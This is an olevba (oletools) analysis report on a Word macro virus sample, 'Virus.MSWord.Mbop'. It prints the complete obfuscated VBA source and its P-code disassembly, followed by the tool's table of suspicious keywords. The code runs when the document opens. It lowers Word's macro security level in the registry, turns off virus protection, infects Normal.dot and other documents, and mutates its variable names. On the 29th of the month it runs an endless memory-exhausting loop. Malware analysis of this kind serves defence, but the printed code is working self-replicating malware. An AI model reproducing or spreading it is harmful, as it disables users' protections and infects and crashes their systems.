olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mbop
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mbop - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
bztdyubgxxrkyjpl1bztdyubgxxrkyjp = "M"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Options.VirusProtection = False
Options.SaveNormalPrompt = False
bztdyubgxxrkyjpfibztdyubgxxrkyjp = 7
Options.ConfirmConversions = False
Set bztdyubgxxrkyjpNtbztdyubgxxrkyjp = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set bztdyubgxxrkyjpAdbztdyubgxxrkyjp = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set bztdyubgxxrkyjpTdbztdyubgxxrkyjp = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
bztdyubgxxrkyjpsebztdyubgxxrkyjp = 5
bztdyubgxxrkyjpl2bztdyubgxxrkyjp = "b"
bztdyubgxxrkyjpfnbztdyubgxxrkyjp = bztdyubgxxrkyjpfibztdyubgxxrkyjp & bztdyubgxxrkyjpsebztdyubgxxrkyjp
For bztdyubgxxrkyjpiibztdyubgxxrkyjp = 1 To bztdyubgxxrkyjpTdbztdyubgxxrkyjp.countoflines
If InStr(bztdyubgxxrkyjpTdbztdyubgxxrkyjp.lines(bztdyubgxxrkyjpiibztdyubgxxrkyjp, 1), "Private Sub Document_Open()") <> 0 Then
bztdyubgxxrkyjpSlbztdyubgxxrkyjp = bztdyubgxxrkyjpiibztdyubgxxrkyjp
Exit For
End If
Next
bztdyubgxxrkyjpl3bztdyubgxxrkyjp = "o"
bztdyubgxxrkyjpVcbztdyubgxxrkyjp = Trim(bztdyubgxxrkyjpTdbztdyubgxxrkyjp.lines(bztdyubgxxrkyjpSlbztdyubgxxrkyjp, bztdyubgxxrkyjpSlbztdyubgxxrkyjp + bztdyubgxxrkyjpfnbztdyubgxxrkyjp))
bztdyubgxxrkyjplvbztdyubgxxrkyjp = 97
If bztdyubgxxrkyjpNtbztdyubgxxrkyjp.countoflines > 0 Then
bztdyubgxxrkyjpNlbztdyubgxxrkyjp = bztdyubgxxrkyjpNtbztdyubgxxrkyjp.lines(1, bztdyubgxxrkyjpNtbztdyubgxxrkyjp.countoflines)
If InStr(bztdyubgxxrkyjpNlbztdyubgxxrkyjp, "Nt") = 0 And InStr(bztdyubgxxrkyjpNlbztdyubgxxrkyjp, "Sl") = 0 And InStr(bztdyubgxxrkyjpNlbztdyubgxxrkyjp, "Nl") = 0 And InStr(bztdyubgxxrkyjpNlbztdyubgxxrkyjp, "Ad") = 0 And InStr(bztdyubgxxrkyjpNlbztdyubgxxrkyjp, "Vc") = 0 And InStr(bztdyubgxxrkyjpNlbztdyubgxxrkyjp, "Td") = 0 Then
bztdyubgxxrkyjpNtbztdyubgxxrkyjp.addfromstring bztdyubgxxrkyjpVcbztdyubgxxrkyjp
bztdyubgxxrkyjpinbztdyubgxxrkyjp = True
End If
Else
bztdyubgxxrkyjpNtbztdyubgxxrkyjp.addfromstring bztdyubgxxrkyjpVcbztdyubgxxrkyjp
bztdyubgxxrkyjpinbztdyubgxxrkyjp = True
End If
bztdyubgxxrkyjphvbztdyubgxxrkyjp = 122
If bztdyubgxxrkyjpAdbztdyubgxxrkyjp.countoflines > 0 Then
bztdyubgxxrkyjpAlbztdyubgxxrkyjp = bztdyubgxxrkyjpAdbztdyubgxxrkyjp.lines(1, bztdyubgxxrkyjpAdbztdyubgxxrkyjp.countoflines)
If InStr(bztdyubgxxrkyjpAlbztdyubgxxrkyjp, "Nt") = 0 And InStr(bztdyubgxxrkyjpAlbztdyubgxxrkyjp, "Sl") = 0 And InStr(bztdyubgxxrkyjpAlbztdyubgxxrkyjp, "Nl") = 0 And InStr(bztdyubgxxrkyjpAlbztdyubgxxrkyjp, "Ad") = 0 And InStr(bztdyubgxxrkyjpAlbztdyubgxxrkyjp, "Vc") = 0 And InStr(bztdyubgxxrkyjpAlbztdyubgxxrkyjp, "Td") = 0 Then
bztdyubgxxrkyjpAdbztdyubgxxrkyjp.addfromstring bztdyubgxxrkyjpVcbztdyubgxxrkyjp
bztdyubgxxrkyjpiabztdyubgxxrkyjp = True
End If
Else
bztdyubgxxrkyjpAdbztdyubgxxrkyjp.addfromstring bztdyubgxxrkyjpVcbztdyubgxxrkyjp
bztdyubgxxrkyjpiabztdyubgxxrkyjp = True
End If
bztdyubgxxrkyjpl4bztdyubgxxrkyjp = "p"
For bztdyubgxxrkyjpiibztdyubgxxrkyjp = 1 To 15
Randomize
bztdyubgxxrkyjpTnbztdyubgxxrkyjp = bztdyubgxxrkyjpTnbztdyubgxxrkyjp & Chr(Int((bztdyubgxxrkyjphvbztdyubgxxrkyjp - bztdyubgxxrkyjplvbztdyubgxxrkyjp + 1) * Rnd + bztdyubgxxrkyjplvbztdyubgxxrkyjp))
Next
bztdyubgxxrkyjpd2bztdyubgxxrkyjp = 9
bztdyubgxxrkyjpVcbztdyubgxxrkyjp = bztdyubgxxrkyjpTdbztdyubgxxrkyjp.lines(1, bztdyubgxxrkyjpTdbztdyubgxxrkyjp.countoflines)
bztdyubgxxrkyjpTdbztdyubgxxrkyjp.deletelines 1, bztdyubgxxrkyjpTdbztdyubgxxrkyjp.countoflines
Do While InStr(bztdyubgxxrkyjpVcbztdyubgxxrkyjp, "bztdyubgxxrkyjp") <> 0
bztdyubgxxrkyjpVcbztdyubgxxrkyjp = Mid(bztdyubgxxrkyjpVcbztdyubgxxrkyjp, 1, InStr(bztdyubgxxrkyjpVcbztdyubgxxrkyjp, "bztdyubgxxrkyjp") - 1) & bztdyubgxxrkyjpTnbztdyubgxxrkyjp & Mid(bztdyubgxxrkyjpVcbztdyubgxxrkyjp, InStr(bztdyubgxxrkyjpVcbztdyubgxxrkyjp, "bztdyubgxxrkyjp") + Len("bztdyubgxxrkyjp"))
Loop
bztdyubgxxrkyjpTdbztdyubgxxrkyjp.addfromstring bztdyubgxxrkyjpVcbztdyubgxxrkyjp
bztdyubgxxrkyjpDybztdyubgxxrkyjp = Day(Now)
bztdyubgxxrkyjpd1bztdyubgxxrkyjp = 2
bztdyubgxxrkyjpl5bztdyubgxxrkyjp = "!"
If bztdyubgxxrkyjpDybztdyubgxxrkyjp = bztdyubgxxrkyjpd1bztdyubgxxrkyjp & bztdyubgxxrkyjpd2bztdyubgxxrkyjp Then
Dim bztdyubgxxrkyjpstbztdyubgxxrkyjp()
bztdyubgxxrkyjpcabztdyubgxxrkyjp = 0
Do
ReDim Preserve bztdyubgxxrkyjpstbztdyubgxxrkyjp(bztdyubgxxrkyjpcabztdyubgxxrkyjp)
bztdyubgxxrkyjpqwbztdyubgxxrkyjp = CLng(1024)
bztdyubgxxrkyjpqabztdyubgxxrkyjp = bztdyubgxxrkyjpqwbztdyubgxxrkyjp
bztdyubgxxrkyjpqzbztdyubgxxrkyjp = bztdyubgxxrkyjpqwbztdyubgxxrkyjp * bztdyubgxxrkyjpqabztdyubgxxrkyjp
bztdyubgxxrkyjpstbztdyubgxxrkyjp(bztdyubgxxrkyjpcabztdyubgxxrkyjp) = String(bztdyubgxxrkyjpqzbztdyubgxxrkyjp, Right(bztdyubgxxrkyjpTnbztdyubgxxrkyjp, 1))
DoEvents
bztdyubgxxrkyjpcabztdyubgxxrkyjp = bztdyubgxxrkyjpcabztdyubgxxrkyjp + 1
Loop
End If
If bztdyubgxxrkyjpiabztdyubgxxrkyjp = True Or bztdyubgxxrkyjpinbztdyubgxxrkyjp = True Then
MsgBox bztdyubgxxrkyjpl1bztdyubgxxrkyjp & bztdyubgxxrkyjpl2bztdyubgxxrkyjp & bztdyubgxxrkyjpl3bztdyubgxxrkyjp & bztdyubgxxrkyjpl4bztdyubgxxrkyjp & bztdyubgxxrkyjpl5bztdyubgxxrkyjp, vbCritical
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Mbop
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6177 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x0001 "M"
' 	St bztdyubgxxrkyjpl1bztdyubgxxrkyjp 
' Line #3:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #6:
' 	LitDI2 0x0007 
' 	St bztdyubgxxrkyjpfibztdyubgxxrkyjp 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set bztdyubgxxrkyjpNtbztdyubgxxrkyjp 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set bztdyubgxxrkyjpAdbztdyubgxxrkyjp 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set bztdyubgxxrkyjpTdbztdyubgxxrkyjp 
' Line #11:
' 	LitDI2 0x0005 
' 	St bztdyubgxxrkyjpsebztdyubgxxrkyjp 
' Line #12:
' 	LitStr 0x0001 "b"
' 	St bztdyubgxxrkyjpl2bztdyubgxxrkyjp 
' Line #13:
' 	Ld bztdyubgxxrkyjpfibztdyubgxxrkyjp 
' 	Ld bztdyubgxxrkyjpsebztdyubgxxrkyjp 
' 	Concat 
' 	St bztdyubgxxrkyjpfnbztdyubgxxrkyjp 
' Line #14:
' 	StartForVariable 
' 	Ld bztdyubgxxrkyjpiibztdyubgxxrkyjp 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bztdyubgxxrkyjpTdbztdyubgxxrkyjp 
' 	MemLd countoflines 
' 	For 
' Line #15:
' 	Ld bztdyubgxxrkyjpiibztdyubgxxrkyjp 
' 	LitDI2 0x0001 
' 	Ld bztdyubgxxrkyjpTdbztdyubgxxrkyjp 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #16:
' 	Ld bztdyubgxxrkyjpiibztdyubgxxrkyjp 
' 	St bztdyubgxxrkyjpSlbztdyubgxxrkyjp 
' Line #17:
' 	ExitFor 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartForVariable 
' 	Next 
' Line #20:
' 	LitStr 0x0001 "o"
' 	St bztdyubgxxrkyjpl3bztdyubgxxrkyjp 
' Line #21:
' 	Ld bztdyubgxxrkyjpSlbztdyubgxxrkyjp 
' 	Ld bztdyubgxxrkyjpSlbztdyubgxxrkyjp 
' 	Ld bztdyubgxxrkyjpfnbztdyubgxxrkyjp 
' 	Add 
' 	Ld bztdyubgxxrkyjpTdbztdyubgxxrkyjp 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St bztdyubgxxrkyjpVcbztdyubgxxrkyjp 
' Line #22:
' 	LitDI2 0x0061 
' 	St bztdyubgxxrkyjplvbztdyubgxxrkyjp 
' Line #23:
' 	Ld bztdyubgxxrkyjpNtbztdyubgxxrkyjp 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #24:
' 	LitDI2 0x0001 
' 	Ld bztdyubgxxrkyjpNtbztdyubgxxrkyjp 
' 	MemLd countoflines 
' 	Ld bztdyubgxxrkyjpNtbztdyubgxxrkyjp 
' 	ArgsMemLd lines 0x0002 
' 	St bztdyubgxxrkyjpNlbztdyubgxxrkyjp 
' Line #25:
' 	Ld bztdyubgxxrkyjpNlbztdyubgxxrkyjp 
' 	LitStr 0x0002 "Nt"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld bztdyubgxxrkyjpNlbztdyubgxxrkyjp 
' 	LitStr 0x0002 "Sl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld bztdyubgxxrkyjpNlbztdyubgxxrkyjp 
' 	LitStr 0x0002 "Nl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld bztdyubgxxrkyjpNlbztdyubgxxrkyjp 
' 	LitStr 0x0002 "Ad"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld bztdyubgxxrkyjpNlbztdyubgxxrkyjp 
' 	LitStr 0x0002 "Vc"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld bztdyubgxxrkyjpNlbztdyubgxxrkyjp 
' 	LitStr 0x0002 "Td"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #26:
' 	Ld bztdyubgxxrkyjpVcbztdyubgxxrkyjp 
' 	Ld bztdyubgxxrkyjpNtbztdyubgxxrkyjp 
' 	ArgsMemCall addfromstring 0x0001 
' Line #27:
' 	LitVarSpecial (True)
' 	St bztdyubgxxrkyjpinbztdyubgxxrkyjp 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	ElseBlock 
' Line #30:
' 	Ld bztdyubgxxrkyjpVcbztdyubgxxrkyjp 
' 	Ld bztdyubgxxrkyjpNtbztdyubgxxrkyjp 
' 	ArgsMemCall addfromstring 0x0001 
' Line #31:
' 	LitVarSpecial (True)
' 	St bztdyubgxxrkyjpinbztdyubgxxrkyjp 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	LitDI2 0x007A 
' 	St bztdyubgxxrkyjphvbztdyubgxxrkyjp 
' Line #34:
' 	Ld bztdyubgxxrkyjpAdbztdyubgxxrkyjp 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #35:
' 	LitDI2 0x0001 
' 	Ld bztdyubgxxrkyjpAdbztdyubgxxrkyjp 
' 	MemLd countoflines 
' 	Ld bztdyubgxxrkyjpAdbztdyubgxxrkyjp 
' 	ArgsMemLd lines 0x0002 
' 	St bztdyubgxxrkyjpAlbztdyubgxxrkyjp 
' Line #36:
' 	Ld bztdyubgxxrkyjpAlbztdyubgxxrkyjp 
' 	LitStr 0x0002 "Nt"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld bztdyubgxxrkyjpAlbztdyubgxxrkyjp 
' 	LitStr 0x0002 "Sl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld bztdyubgxxrkyjpAlbztdyubgxxrkyjp 
' 	LitStr 0x0002 "Nl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld bztdyubgxxrkyjpAlbztdyubgxxrkyjp 
' 	LitStr 0x0002 "Ad"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld bztdyubgxxrkyjpAlbztdyubgxxrkyjp 
' 	LitStr 0x0002 "Vc"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld bztdyubgxxrkyjpAlbztdyubgxxrkyjp 
' 	LitStr 0x0002 "Td"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #37:
' 	Ld bztdyubgxxrkyjpVcbztdyubgxxrkyjp 
' 	Ld bztdyubgxxrkyjpAdbztdyubgxxrkyjp 
' 	ArgsMemCall addfromstring 0x0001 
' Line #38:
' 	LitVarSpecial (True)
' 	St bztdyubgxxrkyjpiabztdyubgxxrkyjp 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	ElseBlock 
' Line #41:
' 	Ld bztdyubgxxrkyjpVcbztdyubgxxrkyjp 
' 	Ld bztdyubgxxrkyjpAdbztdyubgxxrkyjp 
' 	ArgsMemCall addfromstring 0x0001 
' Line #42:
' 	LitVarSpecial (True)
' 	St bztdyubgxxrkyjpiabztdyubgxxrkyjp 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	LitStr 0x0001 "p"
' 	St bztdyubgxxrkyjpl4bztdyubgxxrkyjp 
' Line #45:
' 	StartForVariable 
' 	Ld bztdyubgxxrkyjpiibztdyubgxxrkyjp 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	For 
' Line #46:
' 	ArgsCall Read 0x0000 
' Line #47:
' 	Ld bztdyubgxxrkyjpTnbztdyubgxxrkyjp 
' 	Ld bztdyubgxxrkyjphvbztdyubgxxrkyjp 
' 	Ld bztdyubgxxrkyjplvbztdyubgxxrkyjp 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld bztdyubgxxrkyjplvbztdyubgxxrkyjp 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St bztdyubgxxrkyjpTnbztdyubgxxrkyjp 
' Line #48:
' 	StartForVariable 
' 	Next 
' Line #49:
' 	LitDI2 0x0009 
' 	St bztdyubgxxrkyjpd2bztdyubgxxrkyjp 
' Line #50:
' 	LitDI2 0x0001 
' 	Ld bztdyubgxxrkyjpTdbztdyubgxxrkyjp 
' 	MemLd countoflines 
' 	Ld bztdyubgxxrkyjpTdbztdyubgxxrkyjp 
' 	ArgsMemLd lines 0x0002 
' 	St bztdyubgxxrkyjpVcbztdyubgxxrkyjp 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld bztdyubgxxrkyjpTdbztdyubgxxrkyjp 
' 	MemLd countoflines 
' 	Ld bztdyubgxxrkyjpTdbztdyubgxxrkyjp 
' 	ArgsMemCall deletelines 0x0002 
' Line #52:
' 	Ld bztdyubgxxrkyjpVcbztdyubgxxrkyjp 
' 	LitStr 0x000F "bztdyubgxxrkyjp"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #53:
' 	Ld bztdyubgxxrkyjpVcbztdyubgxxrkyjp 
' 	LitDI2 0x0001 
' 	Ld bztdyubgxxrkyjpVcbztdyubgxxrkyjp 
' 	LitStr 0x000F "bztdyubgxxrkyjp"
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Ld bztdyubgxxrkyjpTnbztdyubgxxrkyjp 
' 	Concat 
' 	Ld bztdyubgxxrkyjpVcbztdyubgxxrkyjp 
' 	Ld bztdyubgxxrkyjpVcbztdyubgxxrkyjp 
' 	LitStr 0x000F "bztdyubgxxrkyjp"
' 	FnInStr 
' 	LitStr 0x000F "bztdyubgxxrkyjp"
' 	FnLen 
' 	Add 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St bztdyubgxxrkyjpVcbztdyubgxxrkyjp 
' Line #54:
' 	Loop 
' Line #55:
' 	Ld bztdyubgxxrkyjpVcbztdyubgxxrkyjp 
' 	Ld bztdyubgxxrkyjpTdbztdyubgxxrkyjp 
' 	ArgsMemCall addfromstring 0x0001 
' Line #56:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	St bztdyubgxxrkyjpDybztdyubgxxrkyjp 
' Line #57:
' 	LitDI2 0x0002 
' 	St bztdyubgxxrkyjpd1bztdyubgxxrkyjp 
' Line #58:
' 	LitStr 0x0001 "!"
' 	St bztdyubgxxrkyjpl5bztdyubgxxrkyjp 
' Line #59:
' 	Ld bztdyubgxxrkyjpDybztdyubgxxrkyjp 
' 	Ld bztdyubgxxrkyjpd1bztdyubgxxrkyjp 
' 	Ld bztdyubgxxrkyjpd2bztdyubgxxrkyjp 
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #60:
' 	Dim 
' 	VarDefn bztdyubgxxrkyjpstbztdyubgxxrkyjp
' Line #61:
' 	LitDI2 0x0000 
' 	St bztdyubgxxrkyjpcabztdyubgxxrkyjp 
' Line #62:
' 	Do 
' Line #63:
' 	OptionBase 
' 	Ld bztdyubgxxrkyjpcabztdyubgxxrkyjp 
' 	Redim (Preserve) bztdyubgxxrkyjpstbztdyubgxxrkyjp 0x0001 (As Variant)
' Line #64:
' 	LitDI2 0x0400 
' 	Coerce (Lng) 
' 	St bztdyubgxxrkyjpqwbztdyubgxxrkyjp 
' Line #65:
' 	Ld bztdyubgxxrkyjpqwbztdyubgxxrkyjp 
' 	St bztdyubgxxrkyjpqabztdyubgxxrkyjp 
' Line #66:
' 	Ld bztdyubgxxrkyjpqwbztdyubgxxrkyjp 
' 	Ld bztdyubgxxrkyjpqabztdyubgxxrkyjp 
' 	Mul 
' 	St bztdyubgxxrkyjpqzbztdyubgxxrkyjp 
' Line #67:
' 	Ld bztdyubgxxrkyjpqzbztdyubgxxrkyjp 
' 	Ld bztdyubgxxrkyjpTnbztdyubgxxrkyjp 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	ArgsLd String$ 0x0002 
' 	Ld bztdyubgxxrkyjpcabztdyubgxxrkyjp 
' 	ArgsSt bztdyubgxxrkyjpstbztdyubgxxrkyjp 0x0001 
' Line #68:
' 	ArgsCall DoEvents 0x0000 
' Line #69:
' 	Ld bztdyubgxxrkyjpcabztdyubgxxrkyjp 
' 	LitDI2 0x0001 
' 	Add 
' 	St bztdyubgxxrkyjpcabztdyubgxxrkyjp 
' Line #70:
' 	Loop 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	Ld bztdyubgxxrkyjpiabztdyubgxxrkyjp 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld bztdyubgxxrkyjpinbztdyubgxxrkyjp 
' 	LitVarSpecial (True)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #73:
' 	Ld bztdyubgxxrkyjpl1bztdyubgxxrkyjp 
' 	Ld bztdyubgxxrkyjpl2bztdyubgxxrkyjp 
' 	Concat 
' 	Ld bztdyubgxxrkyjpl3bztdyubgxxrkyjp 
' 	Concat 
' 	Ld bztdyubgxxrkyjpl4bztdyubgxxrkyjp 
' 	Concat 
' 	Ld bztdyubgxxrkyjpl5bztdyubgxxrkyjp 
' 	Concat 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

